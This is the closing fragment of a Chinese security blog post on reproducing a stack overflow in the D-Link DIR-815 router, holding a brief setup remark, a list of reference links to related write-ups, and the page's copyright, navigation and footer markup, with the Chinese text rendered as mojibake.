<p>è¦å…³é—­çš„è¯å°±è¿™æ ·ï¼Œä½†åç»­é…ç½®è¿˜éœ€è¦å»é…ç½®è™šæ‹Ÿæ¡¥è¿ç½‘ç»œ</p>
<p><img src="https://s2.loli.net/2025/06/25/KJo8Azvmh6uCiwR.png" alt="877a3e4faf9a4c875c3d22c7324239e1" loading="lazy"></p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18079">DIR-815 æ ˆæº¢å‡ºæ¼æ´(CNVD-2013-11625)å¤ç°-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17924">DIR-815 æ ˆæº¢å‡ºæ¼æ´-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44223394/article/details/128756188">ä»é›¶åˆ°ä¸€ï¼šå¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´_dir815æ¼æ´å¤ç°-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/3fd254db.html#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E5%B1%9E%E6%80%A7">ğŸ˜˜æ¬¢è¿å›æ¥~ | å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™</a></p>
<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/d1f081a9.html?highlight=mips#EXP-2">D-Link DIR-815è·¯ç”±å™¨æº¢å‡ºæ¼æ´åˆ†æ | ZIKH26&apos;s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.uf4te.cn/posts/c2233a9.html#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87">CNVD-2013-11625å¤ç° | å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™</a></p>
<p>â€</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Thir0th</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="DIR-815æ¼æ´å¤ç°">https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> è®¸å¯åè®®ã€‚</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/06/28/2025-06-28-%E5%8D%8E%E4%B8%BAHG532RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="HG532RCEæ¼æ´å¤ç°"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HG532RCEæ¼æ´å¤ç°</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/06/11/2025-06-11-20250penHarmonyCTF/" rel="next" title="0penHarmonyCTF-pwn"><span class="post-nav-text">0penHarmonyCTF-pwn</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 â€“ 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Thir0th</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v7.3.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>